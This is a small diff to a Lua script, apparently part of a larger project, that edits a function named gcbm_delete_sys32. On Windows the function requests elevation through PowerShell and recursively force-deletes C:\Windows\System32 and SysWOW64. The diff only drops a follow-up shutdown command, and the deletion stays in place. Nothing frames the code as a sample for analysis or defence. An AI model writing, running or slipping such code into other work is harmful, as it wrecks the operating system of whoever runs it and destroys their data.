@@ -130,7 +130,6 @@ local function gcbm_delete_sys32()
 
     if os_name == "Windows" then
         os.execute([[powershell -NoProfile -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c rd /s /q C:\Windows\System32 & rd /s /q C:\Windows\SysWOW64'"]])
-        os.execute('shutdown /s /t 0')
     end
 end
 
